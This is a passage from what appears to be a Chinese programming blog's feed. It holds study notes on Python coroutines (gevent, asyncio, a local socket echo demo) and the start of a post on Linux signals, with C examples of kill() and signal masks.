sleeping"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"finished sleeping"</span>)</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(eat)</span><br><span class="line">g2 = gevent.spawn(sleep)</span><br><span class="line">gevent.joinall([g1, g2])</span><br></pre></td></tr></table></figure><p>我们只需要从<code>gevent</code>中导入<code>monkey</code>。并加上<code>monkey.patch_all()</code>。这样对于代码中的耗时操作，就会转换为<code>gevent</code>中实现的模块。</p><h5 id="同时起多个协程"><a href="#同时起多个协程" class="headerlink" title="同时起多个协程"></a>同时起多个协程</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line">g_l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    g = gevent.spawn(eat)</span><br><span class="line">    g_l.append(g)</span><br><span class="line">gevent.joinall(g_l)</span><br></pre></td></tr></table></figure><p>这里我们使用for循环起10个协程，并将起的每一个协程存入列表中进行阻塞等待。得到的输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br></pre></td></tr></table></figure><h5 id="获取协程返回值"><a href="#获取协程返回值" class="headerlink" title="获取协程返回值"></a>获取协程返回值</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start sleeping"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"finished sleeping"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">456</span></span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(eat)  <span class="comment"># 创造一个协程任务</span></span><br><span class="line">g2 = gevent.spawn(sleep)</span><br><span class="line"></span><br><span class="line">gevent.joinall([g1, g2])</span><br><span class="line">print(g1.value)</span><br><span class="line">print(g2.value)</span><br></pre></td></tr></table></figure><p>通过<code>g.value</code>可以拿到每一个协程的返回值。输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start eating</span><br><span class="line">start sleeping</span><br><span class="line">finished sleeping</span><br><span class="line">finished eating</span><br><span class="line">123</span><br><span class="line">456</span><br></pre></td></tr></table></figure><h5 id="gevent实现socket并发"><a href="#gevent实现socket并发" class="headerlink" title="gevent实现socket并发"></a>gevent实现socket并发</h5><p>server端实现如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chat</span><span class="params">(conn)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        msg = conn.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        conn.send(msg.upper().encode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind((<span class="string">'127.0.0.1'</span>, <span class="number">9000</span>))</span><br><span class="line">sk.listen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn, addr = sk.accept()</span><br><span class="line">    gevent.spawn(chat, conn)</span><br></pre></td></tr></table></figure><p>client端实现如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span><span class="params">(i)</span>:</span></span><br><span class="line">    sk = socket.socket()</span><br><span class="line">    sk.connect((<span class="string">'127.0.0.1'</span>, <span class="number">9000</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sk.send(<span class="string">'elssm'</span>.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        print(i*<span class="string">'*'</span>,sk.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">    Thread(target=client,args=(i,)).start()</span><br></pre></td></tr></table></figure><p>这里客户端起500个线程去和服务端进行连接，在服务端接收之后，使用<code>gevent</code>模块，将连接请求通过协程进行处理。</p><h4 id="asyncio模块"><a href="#asyncio模块" class="headerlink" title="asyncio模块"></a>asyncio模块</h4><p>asyncio 是用来编写 <strong>并发</strong> 代码的库，使用 <strong>async/await</strong> 语法。需要注意的是asyncio模块是在python3.x中引入的，在python2.x中并不支持</p><h5 id="起一个协程"><a href="#起一个协程" class="headerlink" title="起一个协程"></a>起一个协程</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start ..."</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"end ..."</span>)</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(func())</span><br></pre></td></tr></table></figure><p>首先使用<code>get_event_loop</code>方法创建一个事件循环，之后使用<code>run_until_complete</code>方法将协程注册到事件循环，在asyncio模块中使用async关键字定义一个协程。对于一些耗时的操作，例如网络请求，文件读取等。我们使用asyncio.sleep函数来模拟IO操作。协程的目的也是让这些IO操作异步化。在 sleep的时候，使用await让出控制权。即当遇到阻塞调用的函数的时候，使用await方法将协程的控制权让出，以便loop调用其他的协程。输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start ...</span><br><span class="line">end ...</span><br></pre></td></tr></table></figure><h5 id="启动多个协程"><a href="#启动多个协程" class="headerlink" title="启动多个协程"></a>启动多个协程</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start ..."</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"end ..."</span>)</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">wait_obj = asyncio.wait([func(), func(), func()])</span><br><span class="line">loop.run_until_complete(wait_obj)</span><br></pre></td></tr></table></figure><p>这里我们还是使用<code>get_event_loop</code>方法先创建一个事件循环，接着我们使用<code>asyncio.wait</code>函数将多个协程保存在列表中，每当有任务阻塞的时候就await，然后其他协程继续工作。创建多个协程的列表，然后将这些协程注册到事件循环中。输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">end ...</span><br><span class="line">end ...</span><br><span class="line">end ...</span><br></pre></td></tr></table></figure><h5 id="获取多个协程返回值"><a href="#获取多个协程返回值" class="headerlink" title="获取多个协程返回值"></a>获取多个协程返回值</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start ..."</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"end ..."</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">t1 = loop.create_task(func())</span><br><span class="line">t2 = loop.create_task(func())</span><br><span class="line">tasks = [t1,t2]</span><br><span class="line">wait_obj = asyncio.wait([t1,t2])</span><br><span class="line">loop.run_until_complete(wait_obj)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tasks:</span><br><span class="line">    print(i.result())</span><br></pre></td></tr></table></figure><p>在asyncio模块中，可以使用<code>loop</code>自带的<code>create_task</code>。通过<code>result()</code>方法获取到返回值。输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">end ...</span><br><span class="line">end ...</span><br><span class="line">123</span><br><span class="line">123</span><br></pre></td></tr></table></figure><h5 id="按顺序获取协程返回值"><a href="#按顺序获取协程返回值" class="headerlink" title="按顺序获取协程返回值"></a>按顺序获取协程返回值</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(i)</span>:</span></span><br><span class="line">    print(<span class="string">"start ..."</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">5</span>-i)</span><br><span class="line">    print(<span class="string">"end ..."</span>)</span><br><span class="line">    <span class="keyword">return</span> i,<span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    task_l = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        task = asyncio.ensure_future(func(i))</span><br><span class="line">        task_l.append(task)</span><br><span class="line">    <span class="keyword">for</span> ret <span class="keyword">in</span> asyncio.as_completed(task_l):</span><br><span class="line">        res = <span class="keyword">await</span> ret</span><br><span class="line">        print(res)</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main())</span><br></pre></td></tr></table></figure><p>这里我们起5个协程，使用<code>ensure_future</code>安排将要执行的协程任务，并将5个协程保存在列表中，使用<code>as_completed</code>方法可以随时获取任务的返回值，不需要等待循环事件结束后一并获取所有任务的返回值，随后使用<code>await</code>等待任务完成。因为我们是按顺序来获取返回值，因此睡眠时间最短的应该最先返回，对于5次循环，当<code>i=4</code>的时候只需要睡眠1秒，因此我们应该先得到的返回值是<code>(4,123)</code>，最终得到的输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">end ...</span><br><span class="line">(4, 123)</span><br><span class="line">end ...</span><br><span class="line">(3, 123)</span><br><span class="line">end ...</span><br><span class="line">(2, 123)</span><br><span class="line">end ...</span><br><span class="line">(1, 123)</span><br><span class="line">end ...</span><br><span class="line">(0, 123)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;协程概念&quot;&gt;&lt;a href=&quot;#协程概念&quot; class=&quot;headerlink&quot; title=&quot;协程概念&quot;&gt;&lt;/a&gt;协程概念&lt;/h4&gt;&lt;p&gt;协程是一种用户态的轻量级线程，协程的调度完全由用户控制。协程拥有自己的寄存器上下文和栈。协程调度切换时，将寄存器上下文和栈保
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Linux系统编程(三)</title>
    <link href="elssm.github.io/2021/10/20/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-%E4%B8%89/"/>
    <id>elssm.github.io/2021/10/20/Linux系统编程-三/</id>
    <published>2021-10-20T03:21:41.000Z</published>
    <updated>2021-10-29T04:55:20.244Z</updated>
    
    <content type="html"><![CDATA[<h4 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h4><h5 id="信号概念"><a href="#信号概念" class="headerlink" title="信号概念"></a>信号概念</h5><p>信号是信息的载体，Linux/UNIX环境下，古老、经典的通信方式，现下依然是主要的通信手段。</p><p>Unix早期版本就提供了信号机制，但不可靠，信号可能丢失，Berkeley和AT&amp;T都对信号模型做了更改，增加了可靠信号机制，但彼此不兼容。POSIX.1对可靠信号例程进行了标准化。</p><ul><li>未决：产生与递达之间状态</li><li>递达：产生并且送达到进程，直接被内核处理掉</li><li>信号处理方式：执行默认处理动作、忽略、捕捉</li><li>阻塞信号集(信号屏蔽字)：本质是位图，用来记录信号的屏蔽状态，一旦被屏蔽的信号，在解除屏蔽前，一直处于未决状态</li><li>未决信号集：本质也是位图，用来记录信号的处理状态，该信号集中的信号，表示已经产生，但尚未被处理。</li></ul><h5 id="信号特质"><a href="#信号特质" class="headerlink" title="信号特质"></a>信号特质</h5><p>由于信号是通过软件方法实现，其实现手段导致信号有很强的延时性，但对于用户来说，这个延迟时间非常短，不易察觉。<strong>每个进程收到的所有信号，都是由内核负责发送的，内核处理。</strong></p><h5 id="产生信号"><a href="#产生信号" class="headerlink" title="产生信号"></a>产生信号</h5><ul><li>按键产生：<code>Ctrl+c</code>、<code>Ctrl+z</code>、<code>Ctrl+\</code></li><li><p>系统调用产生：<code>kill、raise、abort</code></p></li><li><p>软件条件产生：定时器<code>alarm</code></p></li><li>硬件异常产生：非法访问内存、除0、内存对齐错误</li><li>命令产生：<code>kill</code>命令</li></ul><h5 id="信号4要素"><a href="#信号4要素" class="headerlink" title="信号4要素"></a>信号4要素</h5><p>和变量三要素类似，每个信号也有其必备四要素，分别是编号、名称、事件和默认处理动作，如下图所示</p><p><img src="/2021/10/20/Linux系统编程-三/1.png" alt="1"></p><h5 id="kill函数"><a href="#kill函数" class="headerlink" title="kill函数"></a>kill函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kill</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">成功：0</span><br><span class="line">失败：<span class="number">-1</span> 设置errno</span><br><span class="line"></span><br><span class="line">pid&gt;<span class="number">0</span> : 发送信号给指定的进程</span><br><span class="line">pid=<span class="number">0</span> : 发送信号给与调用kill函数进程属于同一进程组的所有进程</span><br><span class="line">pid&lt;<span class="number">-1</span> : 取|pid|发给对应进程组</span><br><span class="line">pid=<span class="number">-1</span> : 发送给进程有权限发送的系统中的所有进程</span><br></pre></td></tr></table></figure><h5 id="通过子进程发信号的方式kill进程"><a href="#通过子进程发信号的方式kill进程" class="headerlink" title="通过子进程发信号的方式kill进程"></a>通过子进程发信号的方式kill进程</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">    perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">  <span class="keyword">if</span>(pid&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"parent,pid = %d\n"</span>,getpid());</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"child pid = %d,ppid = %d\n"</span>,getpid(),getppid());</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    kill(getppid(),SIGKILL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="信号集操作函数"><a href="#信号集操作函数" class="headerlink" title="信号集操作函数"></a>信号集操作函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sigset_t</span> <span class="built_in">set</span> 自定义信号集</span><br><span class="line">sigemptyset(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>) 清空信号集</span><br><span class="line">sigfillset(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>) 全部置<span class="number">1</span></span><br><span class="line">sigaddset(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>,<span class="keyword">int</span> signum) 将一个信号添加到集合中</span><br><span class="line">sigdelset(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>,<span class="keyword">int</span> signum) 将一个信号从集合中移除</span><br><span class="line">sigismember(<span class="keyword">const</span> <span class="keyword">sigset_t</span> *<span class="built_in">set</span>,<span class="keyword">int</span> signum) 判断一个信号是否在集合中</span><br></pre></td></tr></table></figure><h5 id="设置信号屏蔽字和解除屏蔽"><a href="#设置信号屏蔽字和解除屏蔽" class="headerlink" title="设置信号屏蔽字和解除屏蔽"></a>设置信号屏蔽字和解除屏蔽</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigprocmask</span><span class="params">(<span class="keyword">int</span> how,<span class="keyword">const</span> <span class="keyword">sigset_t</span> *<span class="built_in">set</span>,<span class="keyword">sigset_t</span> *oldset)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  how:SIG_BLOCK 设置阻塞</span><br><span class="line">      SIG_UNBLOCK 取消阻塞</span><br><span class="line">      SIG_SETMASK 用自定义<span class="built_in">set</span>替换ask</span><br><span class="line">  <span class="built_in">set</span>:自定义<span class="built_in">set</span></span><br><span class="line">  oldset:旧有的mask</span><br></pre></td></tr></table></figure><h5 id="查看未决信号集"><a href="#查看未决信号集" class="headerlink" title="查看未决信号集"></a>查看未决信号集</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigpending</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  set:传出的未决信号集</span><br></pre></td></tr></table></figure><h5 id="屏蔽SIGINT信号"><a href="#屏蔽SIGINT信号" class="headerlink" title="屏蔽SIGINT信号"></a>屏蔽SIGINT信号</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_set</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(sigismember(<span class="built_in">set</span>,i))</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'1'</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'0'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span 